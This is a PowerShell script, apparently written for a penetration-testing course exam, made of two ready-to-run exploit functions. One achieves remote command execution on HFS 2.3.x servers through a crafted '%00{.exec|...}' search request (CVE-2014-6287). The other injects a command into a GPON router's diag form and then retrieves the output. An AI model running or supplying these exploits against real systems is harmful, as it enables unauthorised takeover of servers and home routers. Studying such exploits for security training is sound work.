function ExploitHFS
{ 
<#

.SYNOPSIS
This script written to exploit CVE-2014-6287 in HFS server version 2.3.x

.DESCRIPTION
The original exploit can be found here: https://www.exploit-db.com/exploits/39161/ , this is a powershell version of the original exploit writter for learning purposes in PSSE course.

.PARAMETER Target
The Ip address of the target system that has HFS

.PARAMETER Command
The command to execute

.EXAMPLE
. .\Exploits-in-PowerShell.ps1
ExploitHFS -Target [ip]:[port] -Command C:\Windows\System32\calc.exe

.LINK
https://www.exploit-db.com/exploits/39161/
https://github.com/ahhh/PSSE/blob/master/Exploit-CVE-2014-6287.ps1
https://packetstormsecurity.com/files/128243/HttpFileServer-2.3.x-Remote-Command-Execution.html


.NOTES
This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam
http://www.securitytube-training.com/online-courses/powershell-for-pentesters/
Student ID: PSP-3225

#>

	[CmdletBinding()]
	Param (
	
		[Parameter(Mandatory=$true)]
		[String]
		$Target,
			
		[Parameter(Mandatory=$true)]
		[String]
		$Command
	)
		# execute the provided command from user
		curl "http://$Target/?search=%00{.exec|$Command.}"
}

function ExploitGPONRouter 
{

<#

.SYNOPSIS
This script written to exploit an RCE in GPON routers

.DESCRIPTION
The original exploit can be found here:https://www.exploit-db.com/exploits/44576/ , this is a powershell version of the original exploit writter for learning purposes in PSSE course.

.PARAMETER Target
The Ip address of the target to exploit

.PARAMETER DestinationHost
The destination host to invoke ping command on

.EXAMPLE
. .\Exploits-in-PowerShell.ps1
ExploitGPONRouter -Target [ip]:[port] -DestinationHost [Destination ip]

.LINK
https://www.exploit-db.com/exploits/44576/

.NOTES
This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam
http://www.securitytube-training.com/online-courses/powershell-for-pentesters/
Student ID: PSP-3225

#>

	[CmdletBinding()] param (
		[Parameter(Mandatory=$true)]
		[String]
		$Target,
		[Parameter(Mandatory=$true)]
        [String]
        $DestinationHost
		
    )

	write-host "[+] Executing ping command on: $DestinationHost" -ForegroundColor Green
	
	# Exploit the RCE using curl
	curl.exe -k -d "XWebPageName=diag&diag_action=ping&wan_conlist=0&dest_host=\``$DestinationHost\``;$DestinationHost&ipv=0" $Target/GponForm/diag_Form?images/
	
	write-host "[+] Printing output" -ForegroundColor Green
	
	# Download the output of the executed command
	curl.exe -k $Target/diag.html?images/ 

}
